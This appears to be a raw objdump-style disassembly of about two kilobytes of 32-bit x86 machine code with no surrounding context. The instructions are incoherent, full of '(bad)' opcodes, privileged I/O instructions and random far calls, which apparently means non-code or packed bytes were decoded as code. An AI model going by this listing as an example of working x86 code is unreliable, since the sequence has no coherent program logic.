  4097c0:	mov    ds:0xaa0b28d1,al
  4097c5:	mov    DWORD PTR [esi+0x6c66b6c5],ebp
  4097cb:	adc    bl,cl
  4097cd:	sub    al,0xa4
  4097cf:	push   ecx
  4097d0:	mov    ah,0x81
  4097d2:	fst    DWORD PTR es:[esi-0x1df27c7f]
  4097d9:	nop
  4097da:	sub    edx,DWORD PTR [ebp-0x6231648c]
  4097e0:	daa    
  4097e1:	test   eax,0xf1413e2a
  4097e6:	loope  0x4097ee
  4097e8:	test   DWORD PTR [eax+ebp*4-0x1b209175],edi
  4097ef:	or     al,0x6f
  4097f1:	push   ss
  4097f2:	or     ebx,DWORD PTR [edi+0x2f]
  4097f5:	xchg   ebx,eax
  4097f6:	dec    ecx
  4097f7:	(bad)  
  4097f8:	call   0x1e3b2ff
  4097fd:	and    bh,dl
  4097ff:	cs jecxz 0x40987c
  409802:	iret   
  409803:	pop    edi
  409804:	ret    
  409805:	sbb    al,0x91
  409807:	(bad)  
  409808:	fdivr  st(0),st
  40980a:	xor    eax,0x77883e83
  40980f:	xor    ah,dl
  409811:	sbb    eax,esi
  409813:	mov    al,ah
  409815:	(bad)  
  409816:	jb     0x4097bb
  409818:	pop    esp
  409819:	cmp    cl,al
  40981b:	pop    edx
  40981c:	out    0xd5,al
  40981e:	mov    esp,0x5657ee01
  409823:	xchg   edx,eax
  409824:	adc    al,0x4a
  409826:	gs pop ecx
  409828:	mov    ds:0x40e875e2,al
  40982d:	or     DWORD PTR [edx-0x3f],eax
  409830:	mov    esi,0xea1188b3
  409835:	and    bh,0x5d
  409838:	leave  
  409839:	cmp    DWORD PTR [eax-0x45],eax
  40983c:	xchg   DWORD PTR [ebx-0x2f],esp
  40983f:	sbb    al,BYTE PTR [eax]
  409841:	int    0xe7
  409843:	fbstp  TBYTE PTR [eax-0x26]
  409846:	push   es
  409847:	hlt    
  409848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409849:	cld    
  40984a:	lods   eax,DWORD PTR ds:[esi]
  40984b:	cmp    esi,DWORD PTR [ecx]
  40984d:	cli    
  40984e:	das    
  40984f:	jp     0x4097d1
  409851:	inc    eax
  409852:	cli    
  409853:	sub    al,0xa1
  409855:	mov    ds:0x1b60e31c,al
  40985a:	jecxz  0x4098c5
  40985c:	cmovg  eax,DWORD PTR [esi]
  40985f:	add    al,0x4e
  409861:	adc    bl,bl
  409863:	xchg   edx,eax
  409864:	and    al,0x45
  409866:	mov    al,al
  409868:	pusha  
  409869:	ja     0x40980c
  40986b:	bound  esp,QWORD PTR [esi-0xd]
  40986e:	in     eax,0xb7
  409870:	inc    eax
  409871:	loope  0x4098b3
  409873:	xchg   edx,eax
  409874:	or     al,BYTE PTR [ebx+edi*4]
  409877:	cmp    al,0xdd
  409879:	xchg   DWORD PTR [edi-0x5d1db3f8],ebp
  40987f:	scas   eax,DWORD PTR es:[edi]
  409880:	adc    DWORD PTR [esi+0x7d],0x5bde3b20
  409887:	shl    BYTE PTR [ebx],1
  409889:	out    0xfb,al
  40988b:	in     eax,dx
  40988c:	xor    eax,esp
  40988e:	loopne 0x409904
  409890:	repz push edi
  409892:	xor    edi,DWORD PTR [edx-0x5]
  409895:	pusha  
  409896:	mov    ch,0x6c
  409898:	xchg   ebx,eax
  409899:	aad    0x75
  40989b:	in     al,0x5d
  40989d:	or     al,0x89
  40989f:	mov    ch,0x9
  4098a1:	ret    
  4098a2:	int    0x2d
  4098a4:	inc    edx
  4098a5:	mov    al,ds:0xe18e9d67
  4098aa:	std    
  4098ab:	imul   eax,DWORD PTR [ebp-0x35],0xffffffc8
  4098af:	div    BYTE PTR [edx]
  4098b1:	cdq    
  4098b2:	dec    eax
  4098b3:	or     BYTE PTR [esi-0x23],dl
  4098b6:	sub    ecx,DWORD PTR [eax]
  4098b8:	outs   dx,DWORD PTR ds:[esi]
  4098b9:	sti    
  4098ba:	mov    ebp,0x5a0ac3c9
  4098bf:	sbb    cl,BYTE PTR [ebx+0x31]
  4098c2:	rcr    DWORD PTR [esi+esi*8-0x12],cl
  4098c6:	mov    bl,0x59
  4098c8:	pop    esp
  4098c9:	daa    
  4098ca:	popf   
  4098cb:	fs fadd st,st(4)
  4098ce:	into   
  4098cf:	add    eax,0x73bc39be
  4098d4:	rol    cl,0x33
  4098d7:	push   eax
  4098d8:	and    DWORD PTR [eax-0x29],eax
  4098db:	stos   DWORD PTR es:[edi],eax
  4098dc:	icebp  
  4098dd:	clc    
  4098de:	sti    
  4098df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098e0:	leave  
  4098e1:	pop    ebp
  4098e2:	cwde   
  4098e3:	jo     0x409904
  4098e5:	and    al,0x7d
  4098e7:	call   0xf57c894a
  4098ec:	aam    0x5f
  4098ee:	jbe    0x409935
  4098f0:	std    
  4098f1:	inc    ebx
  4098f2:	aam    0x41
  4098f4:	dec    ebp
  4098f5:	cmp    BYTE PTR [ebx],ah
  4098f7:	jg     0x409957
  4098f9:	push   ss
  4098fa:	gs cmp esi,esi
  4098fd:	mov    al,ds:0x88738c3d
  409902:	xchg   BYTE PTR [eax+0x41],bl
  409905:	ror    DWORD PTR [ebx-0x63],cl
  409908:	stos   DWORD PTR es:[edi],eax
  409909:	push   0xc792c016
  40990e:	outs   dx,DWORD PTR ds:[esi]
  40990f:	add    eax,0xd97dae76
  409914:	jnp    0x4098e4
  409916:	div    DWORD PTR [esi]
  409918:	and    edi,DWORD PTR [esi]
  40991a:	(bad)  
  40991b:	cs nop
  40991d:	ret    
  40991e:	mov    ebp,esp
  409920:	lods   eax,DWORD PTR ds:[esi]
  409921:	cmp    ebx,DWORD PTR ds:[edi-0x4d306edd]
  409928:	jbe    0x40998d
  40992a:	dec    ecx
  40992b:	adc    bh,dh
  40992d:	lahf   
  40992e:	cmp    al,0x85
  409930:	dec    eax
  409931:	test   BYTE PTR [eax+0x48b853f9],dh
  409937:	fucomp st(0)
  409939:	pop    ecx
  40993a:	es jle 0x4098dd
  40993d:	test   DWORD PTR [ebp+0x7e],ebp
  409940:	adc    edi,ecx
  409942:	add    ebp,DWORD PTR [edi-0x13]
  409945:	ret    
  409946:	gs inc edx
  409948:	call   0xd68a39da
  40994d:	push   cs
  40994e:	add    esp,ebx
  409950:	aas    
  409951:	push   ds
  409952:	sub    eax,0x9f840662
  409957:	xor    BYTE PTR [edx],bh
  409959:	adc    eax,0xdf1401c4
  40995e:	fisttp DWORD PTR [ecx-0x6db882d9]
  409964:	jns    0x409919
  409966:	mov    al,bh
  409968:	mov    edx,0xbd46ee27
  40996d:	mov    edi,DWORD PTR [ebx-0x75]
  409970:	stos   BYTE PTR es:[edi],al
  409971:	(bad)  
  409972:	in     al,0xc2
  409974:	repnz stos BYTE PTR es:[edi],al
  409976:	fimul  DWORD PTR [edx-0x2a]
  409979:	cmp    dl,BYTE PTR [edi-0x2bd39f5e]
  40997f:	test   eax,0xa6fc37ca
  409984:	pusha  
  409985:	inc    edx
  409986:	jmp    0x409a05
  409988:	int3   
  409989:	push   ebx
  40998a:	sar    BYTE PTR [ebx+0x1ed21319],cl
  409990:	into   
  409991:	jns    0x409962
  409993:	sbb    al,dl
  409995:	mov    eax,0x191b4b4d
  40999a:	add    BYTE PTR [edi-0x2b3cf04b],dh
  4099a0:	mov    edx,0xfe0d5547
  4099a5:	mov    al,0xb5
  4099a7:	cmp    DWORD PTR [eax],0xffffff90
  4099aa:	sub    edi,DWORD PTR [ecx-0x22]
  4099ad:	sbb    al,0xf4
  4099af:	xlat   BYTE PTR ds:[ebx]
  4099b0:	cmp    eax,0x62ba9f4e
  4099b5:	mov    eax,0x946c149d
  4099ba:	dec    edx
  4099bb:	lahf   
  4099bc:	cmp    esp,DWORD PTR [ecx+0x2c]
  4099bf:	mov    cl,0xef
  4099c1:	jl     0x4099ba
  4099c3:	pop    ebx
  4099c4:	sahf   
  4099c5:	outs   dx,DWORD PTR ds:[esi]
  4099c6:	xchg   esp,eax
  4099c7:	mov    ecx,0x8bc40617
  4099cc:	dec    ebp
  4099cd:	jmp    0x409951
  4099cf:	(bad)  [eax]
  4099d1:	push   edx
  4099d2:	lahf   
  4099d3:	iret   
  4099d4:	nop
  4099d5:	xchg   BYTE PTR [edi+0xcac035c],bl
  4099db:	fwait
  4099dc:	jne    0x409a24
  4099de:	mov    ecx,0xce82251e
  4099e3:	inc    esi
  4099e4:	rcl    BYTE PTR [ebx],1
  4099e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e7:	test   al,bh
  4099e9:	xchg   BYTE PTR ds:0x90085750,dl
  4099ef:	adc    al,0x6a
  4099f1:	mov    cl,0x9
  4099f3:	mov    ch,0xd
  4099f5:	pusha  
  4099f6:	retf   
  4099f7:	jae    0x4099f9
  4099f9:	adc    al,0x6b
  4099fb:	push   ebp
  4099fc:	sub    DWORD PTR [eax],0xd1ecf898
  409a02:	aas    
  409a03:	sbb    DWORD PTR [esi],edx
  409a05:	lock sub BYTE PTR [ebx+eax*2+0x10],ah
  409a0a:	fbld   TBYTE PTR [ecx+0x7a]
  409a0d:	icebp  
  409a0e:	mov    eax,ds:0x8127fcb4
  409a13:	mov    edi,0x880d0b77
  409a18:	sub    DWORD PTR [eax],ebp
  409a1a:	int3   
  409a1b:	sbb    eax,0x51c5e92f
  409a20:	mov    WORD PTR [edx-0x7a6e2348],fs
  409a26:	out    dx,eax
  409a27:	je     0x409a4f
  409a29:	push   ds
  409a2a:	(bad)  
  409a2b:	xor    al,0x33
  409a2d:	inc    eax
  409a2e:	fadd   DWORD PTR [ecx-0x34]
  409a31:	leave  
  409a32:	mov    edi,DWORD PTR [ecx-0x630f8341]
  409a38:	popf   
  409a39:	and    eax,0xede9f1e6
  409a3e:	jmp    0x409a3e
  409a40:	mov    dl,0x52
  409a42:	jo     0x409a79
  409a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a45:	in     eax,dx
  409a46:	mov    ebx,0x7e52324f
  409a4b:	es sub al,0xad
  409a4e:	mov    ch,0x10
  409a50:	and    DWORD PTR [ebx+0x2a],edx
  409a53:	adc    BYTE PTR [esi],bh
  409a55:	retf   0xa2f1
  409a58:	sbb    BYTE PTR [ecx-0x28],0x30
  409a5c:	dec    ebp
  409a5d:	int    0xb4
  409a5f:	jge    0x409a95
  409a61:	sbb    BYTE PTR [esi+0x2c],ch
  409a64:	outs   dx,DWORD PTR gs:[esi]
  409a66:	jne    0x409ad6
  409a68:	dec    ecx
  409a69:	jl     0x409a1f
  409a6b:	cmp    ebp,eax
  409a6d:	cwde   
  409a6e:	adc    eax,0x7f7df8a2
  409a73:	pop    esi
  409a74:	stc    
  409a75:	ss enter 0x9020,0xe6
  409a7a:	lods   al,BYTE PTR ds:[esi]
  409a7b:	int3   
  409a7c:	add    al,0xcb
  409a7e:	dec    edx
  409a7f:	ret    0x7a4f
  409a82:	jnp    0x409ac8
  409a84:	rcr    DWORD PTR [edx+0x36d98528],0x18
  409a8b:	loope  0x409a79
  409a8d:	xchg   ebp,eax
  409a8e:	std    
  409a8f:	js     0x409a7f
  409a91:	enter  0x9d89,0xa6
  409a95:	push   es
  409a96:	les    edx,FWORD PTR [ebp+0x2d]
  409a99:	(bad)  
  409a9a:	(bad)  
  409a9b:	aaa    
  409a9c:	mov    ebp,esi
  409a9e:	popa   
  409a9f:	sar    BYTE PTR [ebp+0x6a],0x70
  409aa3:	mov    ecx,0x25ece249
  409aa8:	xor    al,0x62
  409aaa:	std    
  409aab:	dec    ebx
  409aac:	fdivr  DWORD PTR [edi+edi*1-0x31]
  409ab0:	xchg   edx,eax
  409ab1:	jae    0x409ac6
  409ab3:	sub    BYTE PTR [eax-0x7427710],bh
  409ab9:	fucomp st(1)
  409abb:	ret    
  409abc:	mov    bl,0xbb
  409abe:	ficomp DWORD PTR [ebx+edi*1+0x2dd57a3a]
  409ac5:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  409ac7:	mov    al,ds:0x52362da7
  409acc:	ja     0x409b08
  409ace:	ins    BYTE PTR es:[edi],dx
  409acf:	xor    ch,BYTE PTR [ebx-0x5e]
  409ad2:	or     eax,DWORD PTR [esp]
  409ad5:	fld    QWORD PTR [edx+eax*2]
  409ad8:	pop    ecx
  409ad9:	out    0xa,al
  409adb:	xlat   BYTE PTR ds:[ebx]
  409adc:	not    DWORD PTR [ebx-0x23e7b6d4]
  409ae2:	shr    DWORD PTR [edi],0xa8
  409ae5:	mov    WORD PTR [edx+0x44],ss
  409ae8:	xchg   ebp,eax
  409ae9:	ret    
  409aea:	je     0x409a9b
  409aec:	icebp  
  409aed:	in     al,dx
  409aee:	xor    ebx,eax
  409af0:	mov    ebx,0x1140adbc
  409af5:	ins    BYTE PTR es:[edi],dx
  409af6:	daa    
  409af7:	pop    ebx
  409af8:	lahf   
  409af9:	into   
  409afa:	leave  
  409afb:	dec    edi
  409afc:	sbb    DWORD PTR [edx+0x3b],edx
  409aff:	fs jge 0x409ad8
  409b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b03:	xchg   esp,eax
  409b04:	imul   ebp,DWORD PTR [esi],0xffffff9d
  409b07:	test   eax,0x381a4ed8
  409b0c:	push   0xffffffa4
  409b0e:	call   0x6e68:0xfdd575a3
  409b15:	ss test ah,bl
  409b18:	adc    ah,bl
  409b1a:	pop    es
  409b1b:	sbb    DWORD PTR [ebx-0x6d],0xb8d9c041
  409b22:	aad    0xcd
  409b24:	adc    bl,dl
  409b26:	imul   ebp,DWORD PTR [edx+ebx*8-0x14],0x5b
  409b2b:	mov    edi,0xc80fc0e7
  409b30:	leave  
  409b31:	jbe    0x409ace
  409b33:	neg    BYTE PTR [edi+edi*8]
  409b36:	adc    bl,BYTE PTR [ecx-0x22]
  409b39:	pop    es
  409b3a:	repz dec ecx
  409b3c:	aas    
  409b3d:	pop    ecx
  409b3e:	push   esp
  409b3f:	or     esp,DWORD PTR [eax+0x5e]
  409b42:	shl    BYTE PTR [ebx+0x314475df],cl
  409b48:	push   ss
  409b49:	mov    eax,DWORD PTR [ecx-0x330f140]
  409b4f:	push   eax
  409b50:	mov    esi,0x9b48ea49
  409b55:	xlat   BYTE PTR ds:[ebx]
  409b56:	mov    ebp,0xbc7c3349
  409b5b:	sbb    eax,0x764f5d4d
  409b60:	jae    0x409b9e
  409b62:	jnp    0x409b7a
  409b64:	jl     0x409be2
  409b66:	aas    
  409b67:	fwait
  409b68:	push   eax
  409b69:	popa   
  409b6a:	push   ebp
  409b6b:	inc    ebp
  409b6c:	xchg   BYTE PTR [eax],ah
  409b6e:	inc    eax
  409b6f:	mov    ebp,0x4ed622b4
  409b74:	xchg   edi,eax
  409b75:	in     al,dx
  409b76:	mov    ds:0x6c92cb73,al
  409b7b:	and    BYTE PTR [edi+0x688988e8],dl
  409b81:	mov    BYTE PTR [esi],dl
  409b83:	les    ebx,FWORD PTR [ebx]
  409b85:	fimul  DWORD PTR [ebp+0x32]
  409b88:	cmc    
  409b89:	ins    DWORD PTR es:[edi],dx
  409b8a:	je     0x409be0
  409b8c:	add    BYTE PTR [eax+0x5d5a1e51],dh
  409b92:	enter  0xa439,0x74
  409b96:	inc    ecx
  409b97:	out    dx,al
  409b98:	in     al,dx
  409b99:	rcl    bl,1
  409b9b:	or     dh,BYTE PTR [ebx+0x421f434b]
  409ba1:	adc    BYTE PTR [ecx],dl
  409ba3:	sub    BYTE PTR [eax-0xc],dl
  409ba6:	in     al,0xb9
  409ba8:	sti    
  409ba9:	inc    ecx
  409baa:	shl    esi,cl
  409bac:	rcl    DWORD PTR ds:0x5111dd4b,cl
  409bb2:	(bad)  
  409bb3:	lods   eax,DWORD PTR ds:[esi]
  409bb4:	jle    0x409ba5
  409bb6:	mov    ecx,0x7c4e17af
  409bbb:	add    DWORD PTR [ebp-0x5d],esi
  409bbe:	imul   ecx,DWORD PTR [edi],0x8cc13023
  409bc4:	and    dl,BYTE PTR [eax+ebp*1+0x61a4a117]
  409bcb:	push   ecx
  409bcc:	xchg   edi,eax
  409bcd:	out    dx,eax
  409bce:	jmp    0xcc8b:0xf23c57cc
  409bd5:	jo     0x409c54
  409bd7:	or     eax,0x81bb564
  409bdc:	jo     0x409c02
  409bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bdf:	shl    DWORD PTR [esi],1
  409be1:	jle    0x409b87
  409be3:	jne    0x409bd7
  409be5:	ins    BYTE PTR es:[edi],dx
  409be6:	(bad)  
  409be7:	out    dx,eax
  409be8:	ds adc al,0x3c
  409beb:	mov    eax,ds:0x7595fe37
  409bf0:	mov    ds:0x9cb7268e,al
  409bf5:	mov    eax,0x59557f22
  409bfa:	push   esp
  409bfb:	pop    eax
  409bfc:	mov    edi,DWORD PTR [edx]
  409bfe:	int3   
  409bff:	push   eax
  409c00:	and    al,0x14
  409c02:	mov    esi,0xca6c61a7
  409c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c08:	inc    ecx
  409c09:	cmp    DWORD PTR [eax],ecx
  409c0b:	and    DWORD PTR cs:[eax+edx*4-0x19],edi
  409c10:	inc    eax
  409c11:	or     cl,BYTE PTR [ebx]
  409c13:	inc    esi
  409c14:	sub    edi,DWORD PTR [edi]
  409c16:	add    BYTE PTR [edx-0x60f6aafb],ah
  409c1c:	bound  ebp,QWORD PTR [edi+0x69]
  409c1f:	retf   0x1020
  409c22:	out    dx,eax
  409c23:	(bad)  
  409c24:	(bad)  
  409c25:	push   ecx
  409c26:	cli    
  409c27:	inc    esi
  409c28:	cli    
  409c29:	pop    edx
  409c2a:	sub    BYTE PTR [ebp+0x6bb4caf2],bl
  409c30:	int3   
  409c31:	pop    eax
  409c32:	mov    cl,ch
  409c34:	test   cl,dh
  409c36:	pusha  
  409c37:	mov    esp,0x715dfce1
  409c3c:	mov    bl,0xeb
  409c3e:	ficom  DWORD PTR [eax-0x4e]
  409c41:	push   0xeb2a333e
  409c46:	aaa    
  409c47:	cmp    ebp,DWORD PTR ds:0xcf6c2cea
  409c4d:	pop    edi
  409c4e:	cmp    eax,0xc1ff6303
  409c53:	idiv   ah
  409c55:	jge    0x409c1a
  409c57:	xlat   BYTE PTR ds:[ebx]
  409c58:	arpl   WORD PTR [edi-0x7d],ax
  409c5b:	push   esp
  409c5c:	and    cl,BYTE PTR [ebp+0x4e717cd1]
  409c62:	leave  
  409c63:	rcr    BYTE PTR [ebx],0xd0
  409c66:	in     eax,dx
  409c67:	push   0xffffff86
  409c69:	jg     0x409c82
  409c6b:	retf   0x7561
  409c6e:	pusha  
  409c6f:	sbb    DWORD PTR [edi+0x7d70614],ebx
  409c75:	fs repz pop esp
  409c78:	pop    ecx
  409c79:	fimul  WORD PTR [edx+0x13]
  409c7c:	dec    ebp
  409c7d:	call   0x83ee:0x52648407
  409c84:	push   0xffffffb4
  409c86:	mov    ds:0xe0577e70,eax
  409c8b:	rcr    DWORD PTR [ebx-0x2b],cl
  409c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c8f:	or     edx,DWORD PTR [edx+0x4f7b98bf]
  409c95:	inc    eax
  409c96:	jno    0x409c18
  409c98:	repnz sar dl,cl
  409c9b:	in     eax,dx
  409c9c:	mov    bl,0x51
  409c9e:	jb     0x409d15
  409ca0:	sbb    ch,bh
  409ca2:	or     eax,0x48dbd65f
  409ca7:	(bad)  
  409ca9:	or     al,0x86
  409cab:	outs   dx,BYTE PTR ds:[esi]
  409cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cad:	or     al,0xc6
  409caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb0:	mov    edi,0x6bde393b
  409cb5:	push   esp
  409cb6:	sti    
  409cb7:	ins    DWORD PTR es:[edi],dx
  409cb8:	push   edi
  409cb9:	call   0x3b6e:0x4ee8d515
  409cc0:	leave  
  409cc1:	data16 add BYTE PTR [edx+0x59a18986],0xa6
  409cc9:	jmp    0xbca1:0x2485e538
  409cd0:	fs push esp
  409cd2:	push   ebp
  409cd3:	clc    
  409cd4:	and    edi,edx
  409cd6:	nop
  409cd7:	sub    eax,0x5e823f3d
  409cdc:	sub    eax,0x68e66894
  409ce1:	inc    edx
  409ce2:	(bad)  
  409ce4:	push   ecx
  409ce5:	sub    eax,0x2a38a52d
  409cea:	and    DWORD PTR [esi-0xb690558],0xb1701efe
  409cf4:	shl    BYTE PTR [ecx],0xaa
  409cf7:	shr    BYTE PTR [esi+0x5cf820fc],0xf2
  409cfe:	push   ds
  409cff:	jns    0x409d12
  409d01:	(bad)  
  409d02:	int    0x91
  409d04:	mov    ds:0xba714e4e,al
  409d09:	and    eax,0x5b456ffe
  409d0e:	cdq    
  409d0f:	pop    eax
  409d10:	jnp    0x409d14
  409d12:	mov    DWORD PTR [edx+0x33],edx
  409d15:	mov    ah,0x1
  409d17:	mov    dh,0xcd
  409d19:	sbb    edi,0xf84ebc1f
  409d1f:	sbb    ebp,DWORD PTR [esi-0x1]
  409d22:	xor    DWORD PTR [edi+0x43172f8f],edi
  409d28:	mov    bh,0xb9
  409d2a:	loop   0x409cf8
  409d2c:	sub    al,0xe8
  409d2e:	je     0x409cc6
  409d30:	xor    DWORD PTR [ebp-0x2f],0xf3d72317
  409d37:	add    al,0x7
  409d39:	mov    al,0x58
  409d3b:	sbb    al,0x86
  409d3d:	ror    DWORD PTR [edi+0x36],cl
  409d40:	or     bl,dh
  409d42:	repnz arpl di,bx
  409d45:	cmp    ebx,ecx
  409d47:	jg     0x409d24
  409d49:	fwait
  409d4a:	ins    DWORD PTR es:[edi],dx
  409d4b:	pop    ecx
  409d4c:	add    al,0xee
  409d4e:	fwait
  409d4f:	cmp    esp,DWORD PTR [edi]
  409d51:	aam    0xfc
  409d53:	outs   dx,BYTE PTR ds:[esi]
  409d54:	sbb    eax,0xe82bf332
  409d59:	call   DWORD PTR [ebp+0x5ef2e731]
  409d5f:	mov    ch,0xf6
  409d61:	push   ecx
  409d62:	pusha  
  409d63:	inc    edx
  409d64:	popa   
  409d65:	shl    DWORD PTR [ebp-0x4a59f76a],1
  409d6b:	(bad)  
  409d6c:	fiadd  DWORD PTR [edx+0x50219e74]
  409d72:	aam    0xa7
  409d74:	sbb    esp,edi
  409d76:	in     eax,0x2a
  409d78:	inc    eax
  409d79:	test   al,0x1e
  409d7b:	or     BYTE PTR [edi-0xadad53e],bh
  409d81:	jp     0x409dc0
  409d83:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409d85:	jp     0x409d20
  409d87:	(bad)  
  409d88:	dec    ebp
  409d89:	test   BYTE PTR [esi],bh
  409d8b:	jnp    0x409d3a
  409d8d:	xor    al,0x1b
  409d8f:	mov    eax,0xf8db43c0
  409d94:	cmp    eax,0xfcd6ca6
  409d99:	sti    
  409d9a:	push   0x7d5e0095
  409d9f:	mov    ch,0x37
  409da1:	mov    ch,cl
  409da3:	xchg   edi,eax
  409da4:	mov    cl,0x5
  409da6:	ins    BYTE PTR es:[edi],dx
  409da7:	add    ecx,ebp
  409da9:	add    cl,BYTE PTR [edi-0x33]
  409dac:	outs   dx,BYTE PTR ds:[esi]
  409dad:	stc    
  409dae:	test   al,0xea
  409db1:	xchg   edx,eax
  409db2:	icebp  
  409db3:	adc    BYTE PTR [ecx-0x1f],dl
  409db6:	mov    ah,0x9b
  409db8:	test   eax,0xa303373
  409dbd:	sub    eax,0x5d7708cc
  409dc2:	add    eax,0xa4fc912a
  409dc7:	mov    eax,0x30f1c0fd
  409dcc:	dec    eax
  409dcd:	lock nop
  409dcf:	daa    
  409dd0:	push   DWORD PTR [esp+ebx*1]
  409dd3:	sti    
  409dd4:	std    
  409dd5:	inc    ebx
  409dd6:	mov    bh,0x40
  409dd8:	ins    DWORD PTR es:[edi],dx
  409dd9:	dec    ecx
  409dda:	repz or eax,0x86f33a88
  409de0:	mov    eax,ds:0x45f705c9
  409de5:	shl    ah,0xa
  409de8:	and    BYTE PTR [edi+eax*4+0x5e443220],cl
  409def:	popa   
  409df0:	daa    
  409df1:	outs   dx,BYTE PTR ds:[esi]
  409df2:	sbb    BYTE PTR [esi],cl
  409df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df5:	xor    al,0x60
  409df7:	mov    esp,0x9e4f682b
  409dfc:	outs   dx,BYTE PTR ds:[esi]
  409dfd:	sti    
  409dfe:	retf   
  409dff:	xchg   esi,eax
  409e00:	leave  
  409e01:	inc    ebx
  409e02:	sbb    ebp,DWORD PTR [edi-0x73]
  409e05:	idiv   DWORD PTR [ebp+0x6]
  409e08:	icebp  
  409e09:	sub    DWORD PTR [esi-0x10],edx
  409e0c:	jl     0x409dcf
  409e0e:	ja     0x409e35
  409e10:	fmul   QWORD PTR [ecx]
  409e12:	push   0x2214498e
  409e17:	fld    TBYTE PTR [edi+eax*1]
  409e1a:	(bad)  
  409e1b:	mov    ebp,0x3124bedc
  409e20:	aad    0x97
  409e22:	jmp    0x409e43
  409e24:	add    ebp,DWORD PTR [ebp-0x346e931e]
  409e2a:	and    DWORD PTR [edx-0x5d5c20ad],edi
  409e30:	loope  0x409e3e
  409e32:	sbb    DWORD PTR [ebp+0x14201081],ecx
  409e38:	arpl   cx,di
  409e3a:	inc    ebx
  409e3b:	and    edx,esp
  409e3d:	outs   dx,DWORD PTR ds:[esi]
  409e3e:	xchg   ecx,eax
  409e3f:	inc    eax
  409e40:	sub    DWORD PTR [ebx-0x365446b9],ebp
  409e46:	push   edi
  409e47:	or     DWORD PTR [edi+0x4bc33cd4],0xffffff90
  409e4e:	bound  eax,QWORD PTR [edi]
  409e50:	xor    al,0xfd
  409e52:	mov    ds:0x95e43cd4,al
  409e57:	xchg   edx,eax
  409e58:	pop    esp
  409e59:	cli    
  409e5a:	xchg   edi,eax
  409e5b:	pop    ds
  409e5c:	dec    DWORD PTR [ecx+0x6e]
  409e5f:	shr    DWORD PTR [edx+0x1b],cl
  409e62:	fist   WORD PTR [esi-0x46]
  409e65:	adc    eax,0x19bd8f1
  409e6a:	sbb    al,0x58
  409e6c:	xchg   edx,eax
  409e6d:	bound  esi,QWORD PTR [esi-0x35]
  409e70:	out    dx,al
  409e71:	mov    eax,ds:0x2cd01eef
  409e76:	sbb    eax,0x259ebef3
  409e7b:	ret    
  409e7c:	dec    esi
  409e7d:	fld    st(7)
  409e7f:	push   0x6d
  409e81:	imul   eax,DWORD PTR [eax-0x74585a68],0x7b
  409e88:	mov    ah,0x97
  409e8a:	fmul   DWORD PTR [edx+0x10df532c]
  409e90:	xchg   ebx,eax
  409e91:	sub    DWORD PTR [edx],ebx
  409e93:	clc    
  409e94:	mov    eax,ds:0xb770591b
  409e99:	cld    
  409e9a:	rcl    bh,0xe5
  409e9d:	out    0xa4,al
  409e9f:	push   ss
  409ea0:	push   edi
  409ea1:	ss sahf 
  409ea3:	dec    edx
  409ea4:	lds    ebp,FWORD PTR [edx+0x32]
  409ea7:	(bad)  [ebp-0x19]
  409eaa:	push   ebx
  409eab:	bound  eax,QWORD PTR [esi]
  409ead:	test   DWORD PTR [eax],0x92b5141e
  409eb3:	retf   0xbcba
  409eb6:	xchg   esp,ebx
  409eb8:	jno    0x409f06
  409eba:	jge    0x409ed2
  409ebc:	fisttp DWORD PTR [edi+0x6f]
  409ebf:	data16 fcomp st(7)
  409ec2:	sbb    DWORD PTR [ecx-0x2007ef7a],0xffffff9d
  409ec9:	jl     0x409e84
  409ecb:	jecxz  0x409f12
  409ecd:	hlt    
  409ece:	xor    eax,0x1d84f062
  409ed3:	pop    esp
  409ed4:	and    BYTE PTR [edi-0x4f],al
  409ed7:	nop
  409ed8:	(bad)  
  409ed9:	rcr    BYTE PTR [ebp-0x48c0830],0xf9
  409ee0:	clc    
  409ee1:	pop    ds
  409ee2:	call   0x90d4:0x7e0fe961
  409ee9:	push   0x9a660baf
  409eee:	and    ecx,DWORD PTR [ebx]
  409ef0:	cmp    ah,bh
  409ef2:	and    BYTE PTR [ebp-0x25e7467f],ah
  409ef8:	mov    ebx,0xd4d71e2e
  409efd:	xchg   ebp,eax
  409efe:	out    dx,eax
  409eff:	sbb    bl,BYTE PTR [eax]
  409f01:	sbb    dh,BYTE PTR gs:[edi+ecx*1]
  409f05:	mov    esp,DWORD PTR [edi]
  409f07:	out    0x2e,eax
  409f09:	in     al,0x14
  409f0b:	lock lods eax,DWORD PTR es:[esi]
  409f0e:	shr    DWORD PTR [edx+0x332a2079],1
  409f14:	push   ds
  409f15:	dec    edx
  409f16:	(bad)  
  409f17:	fld    QWORD PTR [edi]
  409f19:	xchg   ebx,eax
  409f1a:	cmp    DWORD PTR [ebp+0x4c251122],eax
  409f20:	fsub   DWORD PTR [edx]
  409f22:	push   eax
  409f23:	sbb    eax,DWORD PTR [ebp+0x8]
  409f26:	fs jae 0x409eae
  409f29:	into   
  409f2a:	mov    ecx,0x1b0be22c
  409f2f:	rol    DWORD PTR [edx],1
  409f31:	cmp    DWORD PTR [edi+edx*2],edi
  409f34:	xor    eax,DWORD PTR [ecx+0xeac31cd]
  409f3a:	xchg   BYTE PTR [edx+0x3a471022],dh
  409f40:	or     al,0xf3
  409f42:	cmp    BYTE PTR [edi],al
  409f44:	adc    ah,bl
  409f46:	rcl    DWORD PTR ds:0xf1dcfc7b,cl
  409f4c:	sbb    BYTE PTR [eax+esi*4-0x32],dh
  409f50:	imul   cl
  409f52:	sbb    eax,0xa995368b
  409f57:	pop    ebx
  409f58:	pop    ebx
  409f59:	fmul   QWORD PTR [eax-0x856dd09]
  409f5f:	aad    0x8f
  409f61:	sub    eax,0x5fdd0757
  409f66:	in     eax,0x47
  409f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f69:	cli    
